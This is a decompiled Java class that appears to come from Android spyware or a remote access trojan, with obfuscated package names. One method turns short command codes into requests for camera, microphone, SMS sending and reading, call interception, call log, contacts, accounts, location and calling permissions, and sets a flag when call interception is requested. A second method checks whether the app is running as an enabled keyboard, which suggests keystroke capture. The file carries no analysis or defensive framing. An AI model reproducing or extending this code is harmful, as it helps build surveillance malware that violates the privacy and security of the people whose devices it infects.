package com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3;

import android.content.Context;
import android.view.inputmethod.InputMethodInfo;
import android.view.inputmethod.InputMethodManager;
import java.util.ArrayList;
/* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.f */
/* loaded from: classes.dex */
public class C0060f {
    /* renamed from: a */
    public static String[] m175a(String str) {
        try {
            ArrayList arrayList = new ArrayList();
            if (str.contains("CA")) {
                arrayList.add("android.permission.CAMERA");
            }
            if (str.contains("MC")) {
                arrayList.add("android.permission.RECORD_AUDIO");
            }
            if (str.contains("SS")) {
                arrayList.add("android.permission.SEND_SMS");
            }
            if (str.contains("RC")) {
                arrayList.add("android.permission.PROCESS_OUTGOING_CALLS");
                hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f296B = "YES";
            }
            if (str.contains("SW")) {
                arrayList.add("android.permission.SET_WALLPAPER");
            }
            if (str.contains("RS")) {
                arrayList.add("android.permission.READ_SMS");
            }
            if (str.contains("RCG")) {
                arrayList.add("android.permission.READ_CALL_LOG");
            }
            if (str.contains("CRC")) {
                arrayList.add("android.permission.READ_CONTACTS");
            }
            if (str.contains("GA")) {
                arrayList.add("android.permission.GET_ACCOUNTS");
            }
            if (str.contains("LOC")) {
                arrayList.add("android.permission.ACCESS_FINE_LOCATION");
                arrayList.add("android.permission.ACCESS_COARSE_LOCATION");
            }
            if (str.contains("CL")) {
                arrayList.add("android.permission.CALL_PHONE");
            }
            return (String[]) arrayList.toArray(new String[arrayList.size()]);
        } catch (Exception e) {
            return new String[]{"EX", e.getMessage()};
        }
    }

    /* renamed from: b */
    public static boolean m174b(Context context) {
        try {
            String packageName = context.getPackageName();
            for (InputMethodInfo inputMethodInfo : ((InputMethodManager) context.getSystemService("input_method")).getEnabledInputMethodList()) {
                if (inputMethodInfo.getPackageName().equals(packageName)) {
                    return true;
                }
            }
            return false;
        } catch (Exception unused) {
            return false;
        }
    }
}
